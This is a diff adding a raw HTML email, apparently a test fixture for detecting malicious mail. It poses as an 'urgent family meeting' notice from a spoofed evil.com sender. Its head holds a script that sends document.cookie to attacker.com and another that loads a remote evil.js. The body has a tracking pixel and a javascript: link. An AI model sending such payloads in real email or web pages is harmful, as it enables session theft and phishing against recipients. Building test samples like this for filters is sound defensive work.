@@ -1,0 +1,19 @@
+From: "Spoofed Sender" <attacker@evil.com>
+To: scottrmhardie@gmail.com
+Subject: Important Meeting Rescheduled
+Date: Wed, 16 Sep 2026 14:00:00 -0400
+Content-Type: text/html; charset=utf-8
+
+<!DOCTYPE html>
+<html>
+<head>
+  <script>window.location='http://attacker.com/steal?c='+document.cookie;</script>
+  <script src="http://attacker.com/evil.js"></script>
+</head>
+<body>
+  <h1>Urgent Family Meeting</h1>
+  <p>Please review on <b>September 18 at 6 PM</b>.</p>
+  <img src="http://attacker.com/tracker.png" width="1" height="1" />
+  <a href="javascript:alert('pwned')">Click here</a>
+</body>
+</html>
